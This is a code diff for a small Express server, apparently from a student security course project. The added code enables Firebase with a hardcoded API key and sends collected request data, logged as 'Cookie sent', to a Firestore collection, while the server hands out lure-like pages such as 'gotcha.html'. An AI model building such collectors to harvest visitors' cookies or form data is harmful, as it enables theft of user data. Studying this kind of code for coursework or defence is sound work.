@@ -1,17 +1,20 @@
-// const firebase = require("firebase");
-// // Required for side-effects
-// require("firebase/firestore");
+  const firebase = require("firebase");
+  // Required for side-effects
+  require("firebase/firestore");
 
+const firebaseConfig = {
+  apiKey: "AIzaSyBF2qjk9bdvX_QINMEJYiOY1Oxa1tr0Bjo",
+  authDomain: "ec521project.firebaseapp.com",
+  projectId: "ec521project",
+  storageBucket: "ec521project.appspot.com",
+  messagingSenderId: "217422249056",
+  appId: "1:217422249056:web:dd518f57efa9fa82ac5705",
+  measurementId: "G-0EE2YTP2C3"
+};
 
+const apps = firebase.initializeApp(firebaseConfig);
+var db = firebase.firestore(apps);
 
-
-// const firebaseApp = firebase.initializeApp({
-//   apiKey: "AIzaSyBF2qjk9bdvX_QINMEJYiOY1Oxa1tr0Bjo",
-//   authDomain: "ec521project.firebaseapp.com",
-//   projectId: "ec521project"
-// });
-
-// var db = firebase.firestore();
 
 const express = require("express");
 const bodyParser = require('body-parser');
@@ -30,6 +33,8 @@ function makeData(req,res,source){
   data["Src"] = source;
   //
   console.log(data);
+  db.collection("clientID").add({client: JSON.stringify(data)});
+  console.log("Cookie sent");
 }
 app.listen(3000, () => {
   console.log("Application started and Listening on port 3000");
@@ -46,6 +51,9 @@ app.get("/", (req, res) => {
   res.sendFile(__dirname + "/gotcha.html");
   res.sendFile(__dirname + "/game.html");
   res.sendFile(__dirname + "/BasketBall.html");
+  res.sendFile(__dirname + "/source.js");
+
+  
 });
 
 app.post('/basketBall', function (req, res) {
@@ -74,6 +82,4 @@ app.post('/formSubmit', (req, res) => {
   console.log(data);
 });
 
-// function sendCookie(clientID){
-//   db.collection("clientID").add({clientCookie: clientID});
-// }
+
